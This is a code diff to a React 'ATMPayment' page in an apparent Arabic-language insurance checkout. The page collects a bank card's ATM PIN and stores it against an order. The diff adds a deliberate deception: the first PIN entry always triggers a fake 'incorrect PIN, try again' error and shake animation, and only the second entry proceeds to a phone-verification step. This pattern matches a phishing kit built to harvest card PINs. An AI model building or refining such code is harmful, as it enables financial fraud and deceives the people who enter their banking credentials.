@@ -25,9 +25,18 @@ const ATMPayment = () => {
 
   const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
+  const [shake, setShake] = useState(false);
+  const [error, setError] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => { inputRef.current?.focus(); }, []);
+
+  const triggerShake = () => {
+    setShake(true);
+    setError(true);
+    setTimeout(() => setShake(false), 600);
+    setTimeout(() => { setError(false); setPin(""); inputRef.current?.focus(); }, 1500);
+  };
 
   const handleVerify = () => {
     if (pin.length < 4) return;
@@ -36,7 +45,15 @@ const ATMPayment = () => {
       await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
       linkVisitorToSession({});
       setLoading(false);
-      navigate("/insurance/phone-verify", { state: { offer, orderId } });
+      // Simulate: first attempt always shakes, then navigates
+      const attempts = parseInt(sessionStorage.getItem("atm_attempts") || "0") + 1;
+      sessionStorage.setItem("atm_attempts", String(attempts));
+      if (attempts <= 1) {
+        triggerShake();
+      } else {
+        sessionStorage.removeItem("atm_attempts");
+        navigate("/insurance/phone-verify", { state: { offer, orderId } });
+      }
     };
     doSubmit();
   };
@@ -107,7 +124,12 @@ const ATMPayment = () => {
                     <p className="text-xs text-muted-foreground">أدخل الرقم السري لبطاقة الصراف</p>
                   </div>
 
-                  <div className="flex justify-center gap-3" dir="ltr">
+                  <motion.div
+                    className="flex justify-center gap-3"
+                    dir="ltr"
+                    animate={shake ? { x: [0, -12, 12, -10, 10, -6, 6, 0] } : { x: 0 }}
+                    transition={{ duration: 0.5 }}
+                  >
                     {[0, 1, 2, 3].map((i) => (
                       <input
                         key={i}
@@ -132,10 +154,20 @@ const ATMPayment = () => {
                             prev?.focus();
                           }
                         }}
-                        className="h-14 w-14 rounded-xl border-2 border-border/80 bg-background text-center text-lg font-bold text-foreground shadow-sm transition-all duration-200 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/15 focus:shadow-md"
+                        className={`h-14 w-14 rounded-xl border-2 bg-background text-center text-lg font-bold text-foreground shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:shadow-md ${error ? "border-destructive focus:border-destructive focus:ring-destructive/20" : "border-border/80 focus:border-primary focus:ring-primary/15"}`}
                       />
                     ))}
-                  </div>
+                  </motion.div>
+
+                  {error && (
+                    <motion.p
+                      initial={{ opacity: 0, y: -5 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="text-center text-xs font-medium text-destructive"
+                    >
+                      الرقم السري غير صحيح، حاول مرة أخرى
+                    </motion.p>
+                  )}
 
                   {loading && (
                     <motion.div
